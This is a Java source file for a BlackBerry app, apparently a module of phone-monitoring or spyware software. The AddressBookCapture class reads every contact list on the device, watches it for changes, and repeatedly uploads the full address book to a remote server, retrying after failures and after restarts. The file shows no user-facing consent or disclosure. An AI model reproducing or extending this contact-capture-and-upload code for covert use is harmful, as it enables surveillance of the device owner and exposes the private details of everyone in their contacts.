package com.vvt.addrc;

import java.util.Enumeration;
import javax.microedition.pim.PIMException;
import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendAddressBookSyncManager;
import com.vvt.protsrv.addr.AddressBookState;
import com.vvt.protsrv.addr.AddressBookStore;
import com.vvt.protsrv.addr.ContactInfo;
import com.vvt.protsrv.addr.ContactStore;
import com.vvt.std.Log;
import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryContactList;
import net.rim.blackberry.api.pdap.BlackBerryPIM;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.RealtimeClockListener;

public class AddressBookCapture implements PhoenixProtocolListener, RealtimeClockListener {
	
	private final int MAX_RETRY = 5;
	private int retryCnt = 0;
	private boolean started = false;
	private AddressBookState state = AddressBookState.NORMAL;
	private SendAddressBookSyncManager addrSyncMng = Global.getSendAddressBookSyncManager();
	private BlackBerryContactList[] contactList = null;
	private NotifyContact[] notifyC = null;
//	private AddressBookDb addrDb = AddressBookDb.getInstance();
	
	public void startCapture() {
		try {
			if (!started) {
				if (Log.isDebugEnable()) {
					Log.debug("AddressBookCapture.startCapture()", "ENTER");
				}
				started = true;
				AddressBookDb.getInstance().setStampTime(); // Initial time stamp.
				monitorListPIMLists();
				addrSyncMng.addListener(this);
				Application.getApplication().addRealtimeClockListener(this);	
			}
		} catch(Exception e) {
			Log.error("AddressBookCapture.startCapture", "", e);
		}
	}
	
	public void stopCapture() {
		try {
			if (started) {
				started = false;
				if (Log.isDebugEnable()) {
					Log.debug("AddressBookCapture.stopCapture()", "contactList: " + contactList);
				}
				clearMonitorListPIMLists(true);
				Application.getApplication().removeRealtimeClockListener(this);				
				addrSyncMng.cancelTask();
				addrSyncMng.removeListener(this);
				retryCnt = 0;
			}
		} catch(Exception e) {
			Log.error("AddressBookCapture.stopCapture", "", e);
		}
	}
	
	public void reset() {
		stopCapture();
		AddressBookDb.getInstance().resetDb();
	}
	
	private void monitorListPIMLists() {
		try {
			String[] listPIMLists = BlackBerryPIM.getInstance().listPIMLists(BlackBerryPIM.CONTACT_LIST);
			if (listPIMLists.length > 0) {
				contactList = new BlackBerryContactList[listPIMLists.length];
				notifyC = new NotifyContact[listPIMLists.length];
				for (int i = 0; i < listPIMLists.length; i++) {
					contactList[i] = (BlackBerryContactList)BlackBerryPIM.getInstance().openPIMList(BlackBerryPIM.CONTACT_LIST, BlackBerryPIM.READ_ONLY, listPIMLists[i]);
					/*if (Log.isDebugEnable()) {
						Log.debug("AddressBookCapture.monitorListPIMLists()", "listPIMLists.length: " + listPIMLists.length + "listPIMLists: " + listPIMLists[i]);
						Log.debug("AddressBookCapture.monitorListPIMLists()", "contactList" + i + ": " + contactList[i]);
					}*/
					if (contactList[i] != null) {
						notifyC[i] = new NotifyContact();
						contactList[i].addListener(notifyC[i]);
					}
				}
			}
		} catch (Exception e) {
			Log.error("AddressBookCapture.monitorListPIMLists()", e.getMessage(), e);
		}
	}
	
	private void clearMonitorListPIMLists(boolean releaseResource) {
		try {
			for (int i = 0; i < contactList.length; i++) {
				if (contactList[i] != null && notifyC[i] != null) {
					contactList[i].removeListener(notifyC[i]);
					if (releaseResource) {
						contactList[i].close();
					}
				}
			}
			contactList = null;
		} catch (Exception e) {
			Log.error("AddressBookCapture.clearMonitorListPIMLists()", e.getMessage(), e);
		}
	}
	
	private void send() throws PIMException {
		state = AddressBookState.SENDING;
		AddressBookDb.getInstance().setAddressBookChanged(false);
		AddressBookDb.getInstance().setSendCompleted(false);
		AddressBookStore addrStore = initAddressBook();
		addrSyncMng.send(addrStore);
	}
	
	private AddressBookStore initAddressBook() throws PIMException {
		// Added
		String[] listPIMLists = BlackBerryPIM.getInstance().listPIMLists(BlackBerryPIM.CONTACT_LIST);
		if (listPIMLists.length != contactList.length) {
			// ContactList has changed!
			clearMonitorListPIMLists(false);
			monitorListPIMLists();
		} else {
			// If it's not the same ContactList will add listener all ContactList  
			for (int i = 0; i < listPIMLists.length; i++) {
				if (!listPIMLists[i].trim().equals(contactList[i].getName().trim())) {
					// ContactList has changed!
					clearMonitorListPIMLists(false);
					monitorListPIMLists();
				}
			}
		}
		/*if (Log.isDebugEnable()) {
			Log.debug("AddressBookCapture.initAddressBook()", "Addressbook count: " + contactList.length);
		}*/
		AddressBookStore addrStore = new AddressBookStore();
		for (int i = 0; i < contactList.length; i++) {			
			ContactStore contStore = new ContactStore();
			contStore.setAddressBookId(i + 1);
			contStore.setAddressBookName(contactList[i].getName());
			Enumeration contactEnum = contactList[i].items();		
			while (contactEnum.hasMoreElements()) {
				BlackBerryContact contact = (BlackBerryContact)contactEnum.nextElement();
				ContactInfo contInfo = new ContactInfo();
				contInfo.setClientId("0");
				contInfo.setServerId(0);
				contInfo.setContact(contact);
				contStore.addContact(contInfo);			
			}
			addrStore.addContactStore(contStore);
		}
		return addrStore;
	}
	
	private boolean isOneMinPassed() {
		boolean passed = false;
		long stampTime = AddressBookDb.getInstance().getStampTime();
		long curTime = System.currentTimeMillis();
		int min = (int) (curTime - stampTime)/(1000 * 60);
		if (min >= 1) {
			passed = true;
		}
		return passed;
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("AddressBookCapture.onError()", message);
		state = AddressBookState.NORMAL;
		retryCnt++;
	}

	public void onSuccess(CommandResponse response) {
		if (Log.isDebugEnable()) {
			Log.debug("AddressBookCapture.onSuccess()", "ENTER");
		}
		state = AddressBookState.NORMAL;
		AddressBookDb.getInstance().setSendCompleted(true);
		retryCnt = 0;
	}	

	// RealtimeClockListener
	public void clockUpdated() {
//		Log.debug("AddressBookCapture.clockUpdated()", "ENTER");
		try {	
			if (AddressBookDb.getInstance().isAddressBookChanged()) {
				// 1. 1st Send and when contact has changed
				/*if (Log.isDebugEnable()) {
					Log.debug("AddressBookCapture.clockUpdated()", "isAddressBookChanged");
				}*/
				if (isOneMinPassed()) {
					/*if (Log.isDebugEnable()) {
						Log.debug("AddressBookCapture.clockUpdated()", "isAddressBookChanged && isOneMinPassed");
					}*/
					if (state.equals(AddressBookState.SENDING)) {
						/*if (Log.isDebugEnable()) {
							Log.debug("AddressBookCapture.clockUpdated()", "Cancel!");
						}*/
						addrSyncMng.cancelTask();					
					}
					send();
				}
			} else if (!AddressBookDb.getInstance().isSendCompleted() && state.equals(AddressBookState.NORMAL)) { 
				// 1. Send not success and after that restart the device so it will try to send again.
				/*if (Log.isDebugEnable()) {
					Log.debug("AddressBookCapture.clockUpdated()", "!isSendCompleted && state == NORMAL");
				}*/
				if (retryCnt <= MAX_RETRY) {
					send();
				} else {
					AddressBookDb.getInstance().setSendCompleted(true);
					retryCnt = 0;
				}
			}
		} catch (Exception e) {
			Log.error("AddressBookCapture.clockUpdated()", e.getMessage(), e);
		}
	}
	
}
